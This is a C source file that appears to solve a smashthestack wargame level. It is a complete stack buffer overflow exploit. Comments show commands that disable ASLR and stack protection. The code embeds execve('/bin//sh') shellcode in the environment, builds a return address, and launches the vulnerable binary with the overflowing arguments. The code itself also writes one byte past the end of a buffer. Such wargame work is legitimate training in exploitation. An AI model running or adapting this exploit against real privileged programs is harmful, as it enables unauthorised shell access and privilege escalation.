// Disable Address Space Layout Randomization: sysctl -w kernel.randomize_va_space=0
// Disable stack protection: gcc -Wall -g -fno-stack-protector -z execstack level05.c -o level05

#include <stdio.h>
#include <string.h>
#include <unistd.h>

char sc[] = "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";
extern char **environ;

int main(int argc, char **argv)
{
	int buf1_size = 32;
	int buf2_size = 12;
        char buf1[buf1_size];
        char buf2[buf2_size];

        char *env[2] = {sc, NULL};
	const char *binary_path = "/home/robin/Documents/Hacking/smashthestack/io/level08/level08";
	const char *binary = "level08";
        int i;
	int *ptr;


	printf("Using buf1 size: %d\n", buf1_size);
	printf("Using buf2 size: %d\n", buf2_size);


        int ret = 0xbfffffff
		- 4								/* 4 null bytes */
		- strlen(binary_path) - 1	/* binary + null byte */
		- strlen(sc)							/* shellcode + null byte */
		;
       
        
	printf("Removing environment variables\n");
        for(i = 0; environ[i] != NULL; i++) {
		memset(environ[i], 0x00, strlen(environ[i]));
	}


	printf("Adding 'A' to buf1\n");
        for (i = 0; i < buf1_size; i++) {
		buf1[i] = 'A';
	}
	buf1[buf1_size] = '\0';
	printf("strlen(buf1): %d\n", strlen(buf1));

	printf("Adding return address to buf2: 0x%x\n", ret);
        ptr = (int *)(buf2);
        for (i = 0; i < buf2_size; i += 4) {
                *ptr++ = ret;
	}
	printf("strlen(buf2): %d\n", strlen(buf2));

        execle(binary_path, binary, buf1, buf2, NULL, env);
	return 0;
}
